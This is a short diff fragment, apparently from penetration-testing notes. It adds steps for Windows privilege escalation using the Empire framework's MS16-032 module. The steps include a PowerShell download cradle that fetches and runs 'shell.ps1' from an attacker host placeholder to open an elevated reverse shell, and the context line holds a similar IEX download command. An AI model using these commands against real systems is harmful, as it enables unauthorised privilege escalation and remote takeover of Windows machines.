@@ -29,5 +29,9 @@ C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.We
 git clone https://github.com/EmpireProject/Empire.git
 ./setup/install.sh
 
-# 
+# Navigate to Empire/data/module_source/privesc to see if your MS##-### is there, eg. MS16-032
+# Edit Invoke-MS16032.ps1 and call the Invoke function at the bottom
+# Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<attackingip>/shell.ps1')"
+# You can re-use your Sherlock.ps1 shell, just change the port from your low priv.
+
 ```
